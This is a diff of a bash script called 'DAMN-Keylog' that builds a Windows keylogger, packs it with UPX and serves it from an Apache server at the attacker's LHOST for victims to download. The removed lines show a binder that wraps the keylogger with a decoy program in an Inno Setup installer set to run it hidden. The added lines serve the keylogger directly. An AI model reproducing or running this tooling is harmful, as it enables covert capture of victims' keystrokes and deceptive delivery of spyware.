@@ -7,7 +7,6 @@ display_banner() {
   echo -e "\e[92m#                \e[91mDAMN-Keylog\e[92m                    #\e[0m"
   echo -e "\e[92m#                                               #\e[0m"
   echo -e "\e[92m#################################################\e[0m"
-  echo -e "\e[93m"
  
 }
 
@@ -37,39 +36,15 @@ generate_keylogger() {
   echo "Packing the executable with UPX..."
   upx --best --lzma keylogger.exe
 
-  echo "Compiling the dummy executable..."
-  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ dummy.cpp -o dummy.exe
+  echo "Compilation and packing completed. The keylogger executable is keylogger.exe"
 
-  echo "Creating Inno Setup script..."
-  cat <<EOF > installer.iss
-[Setup]
-AppName=DAMN-Keylog
-AppVersion=1.0
-DefaultDirName={pf}\DAMN-Keylog
-DefaultGroupName=DAMN-Keylog
-OutputBaseFilename=SetupBound
-Compression=lzma
-SolidCompression=yes
-
-[Files]
-Source: "dummy.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "keylogger.exe"; DestDir: "{app}"; Flags: ignoreversion
-
-[Run]
-Filename: "{app}\dummy.exe"; Description: "Run Dummy"; Flags: nowait postinstall
-Filename: "{app}\keylogger.exe"; Description: "Run Keylogger"; Flags: nowait postinstall shellexec runhidden
-EOF
-
-  echo "Running Inno Setup to create the installer..."
-  wine "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" installer.iss
-
-  echo "Moving the bound setup executable to the Apache server directory..."
-  sudo mv SetupBound.exe /var/www/html/
+  echo "Moving the keylogger executable to the Apache server directory..."
+  sudo mv keylogger.exe /var/www/html/
 
   echo "Starting Apache server..."
   sudo systemctl start apache2
 
-  echo "The bound setup is available at: http://$LHOST/SetupBound.exe"
+  echo "The keylogger is available at: http://$LHOST/keylogger.exe"
 }
 
 # Function to start the Python server
@@ -81,7 +56,7 @@ start_server() {
 # Ensure the system is updated and install necessary packages
 echo "Updating system and installing necessary packages..."
 sudo apt-get update
-sudo apt-get install -y mingw-w64 python3 apache2 git upx wine
+sudo apt-get install -y mingw-w64 python3 apache2 git upx
 
 # Display the banner
 display_banner
